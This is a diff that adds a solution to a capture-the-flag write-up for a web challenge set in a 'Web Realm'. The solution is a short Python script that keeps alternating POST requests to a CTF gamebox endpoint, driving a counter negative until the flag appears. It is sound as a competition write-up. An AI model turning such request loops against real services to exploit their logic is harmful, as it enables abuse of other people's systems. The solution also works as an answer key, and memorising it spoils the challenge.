@@ -8,8 +8,23 @@ R-Boy arrives in the Web Realm, a celestial domain comprised of floating islands
 
 #### Solution:
 
+- just playing around with the API randomly spitted out the flag around `64000`` negative counter
 
-```bash
+```python
+import requests
+import time
+
+ses = requests.session()
+
+while True:
+    time.sleep(2)
+    r = ses.post(
+        f'http://gamebox1.reply.it/web1-f1103cad4b0542c69e23b267e173799295c4f217/got-a-goat', data={"type": "red"})
+    print(r.text)
+    time.sleep(2)
+    r = ses.post(
+        f'http://gamebox1.reply.it/web1-f1103cad4b0542c69e23b267e173799295c4f217/got-a-goat', data={"type": "green"})
+    print(r.text)
 ```
 
 ---
